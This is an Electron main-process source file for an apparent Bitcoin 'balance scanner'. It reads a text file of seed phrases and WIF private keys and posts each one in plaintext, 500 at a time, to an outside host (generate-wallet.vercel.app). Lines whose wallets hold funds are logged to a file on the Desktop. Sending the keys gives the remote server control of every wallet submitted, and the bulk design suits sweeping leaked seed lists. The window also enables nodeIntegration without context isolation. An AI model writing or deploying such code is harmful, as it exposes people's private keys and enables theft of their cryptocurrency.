const { app, BrowserWindow, ipcMain, shell, dialog } = require('electron');
const path = require('path');
const axios = require('axios');
const bip39 = require('bip39');
const fs = require('fs');

let mainWindow;
let isScanning = false; 

function createWindow() {
    mainWindow = new BrowserWindow({
        width: 1050,
        height: 850,
        minWidth: 800,
        minHeight: 600,
        backgroundColor: '#1e1e1e',
        webPreferences: {
            nodeIntegration: true,
            contextIsolation: false
        }
    });

    mainWindow.loadFile('index.html');

    mainWindow.webContents.setWindowOpenHandler(({ url }) => {
        shell.openExternal(url);
        return { action: 'deny' };
    });
}

app.whenReady().then(createWindow);

app.on('window-all-closed', () => {
    if (process.platform !== 'darwin') app.quit();
});

// --- CONFIGURATION ---
const CONCURRENCY_LIMIT = 500;
const MAX_RETRIES = 5;
const RETRY_DELAY = 1000;

// --- UTILS ---
const sleep = (ms) => new Promise(r => setTimeout(r, ms));

function isValidMnemonic(line) {
    try { return bip39.validateMnemonic(line.trim()); } catch(e) { return false; }
}

function isValidWif(line) {
    const trimmed = line.trim();
    if (trimmed.length < 50 || trimmed.length > 53) return false;
    const firstChar = trimmed[0];
    return ['5', 'K', 'L'].includes(firstChar);
}

// --- FILE SYSTEM HANDLERS ---
ipcMain.handle('open-file-dialog', async () => {
    const { canceled, filePaths } = await dialog.showOpenDialog(mainWindow, {
        properties: ['openFile'],
        filters: [{ name: 'Text Files', extensions: ['txt'] }]
    });
    if (canceled || filePaths.length === 0) return null;
    
    // Read the file and return content
    try {
        return fs.readFileSync(filePaths[0], 'utf8');
    } catch (err) {
        return null;
    }
});

ipcMain.on('open-results-folder', () => {
    // Opens the Desktop folder where we save files
    shell.openPath(app.getPath('desktop'));
});

// --- SCANNERS ---
async function scanLine(line, type) {
    const endpoint = type === 'MNEMONIC' ? 'scan' : 'wif';
    const payload = type === 'MNEMONIC' ? { mnemonic: line.trim(), passphrase: 'null' } : { wif: line.trim() };

    try {
        const res = await axios.post(`https://generate-wallet.vercel.app/api/${endpoint}`, payload);
        const sats = res.data?.result?.grandTotals?.totalBalance || 0;
        return { ok: true, balance: sats / 100000000 };
    } catch (error) {
        return { ok: false, error: error.message };
    }
}

ipcMain.on('stop-scan', () => { isScanning = false; });

ipcMain.on('start-scan', async (event, rawText) => {
    isScanning = true;

    const lines = rawText.split('\n').map(l => l.trim()).filter(l => l.length > 0);
    const uniqueLines = [...new Set(lines)];
    const validItems = uniqueLines.filter(l => isValidMnemonic(l) || isValidWif(l));
    
    mainWindow.webContents.send('status-update', { 
        total: validItems.length, 
        msg: `Prepared ${validItems.length} valid items.` 
    });

    let processedCount = 0;
    let foundCount = 0;
    const startTime = Date.now();

    const processItem = async (line) => {
        if (!isScanning) return;

        let attempts = 0;
        let success = false;
        let result;
        const type = isValidMnemonic(line) ? 'MNEMONIC' : 'WIF';

        while (attempts < MAX_RETRIES && !success && isScanning) {
            attempts++;
            result = await scanLine(line, type);

            if (result.ok) {
                success = true;
                if (result.balance > 0) {
                    foundCount++;
                    const btc = result.balance.toFixed(8);
                    
                    mainWindow.webContents.send('hit-found', { line, balance: btc });
                    
                    const logPath = path.join(app.getPath('desktop'), 'found_balances.txt');
                    fs.appendFileSync(logPath, `${line} | ${btc}\n`);
                }
            } else {
                if (attempts < MAX_RETRIES && isScanning) await sleep(RETRY_DELAY);
            }
        }
        
        processedCount++;
        
        if (processedCount % 10 === 0 || processedCount === validItems.length) {
            const elapsed = (Date.now() - startTime) / 1000;
            const speed = elapsed > 0 ? (processedCount / elapsed).toFixed(1) : "0.0";

            mainWindow.webContents.send('progress', { 
                processed: processedCount, 
                total: validItems.length,
                speed: speed,
                found: foundCount
            });
        }
    };

    const iterator = validItems[Symbol.iterator]();
    const workers = new Array(CONCURRENCY_LIMIT).fill(0).map(async () => {
        for (const item of iterator) {
            if (!isScanning) break;
            await processItem(item);
        }
    });

    await Promise.all(workers);
    mainWindow.webContents.send('finished', { found: foundCount, stopped: !isScanning });
    isScanning = false;
});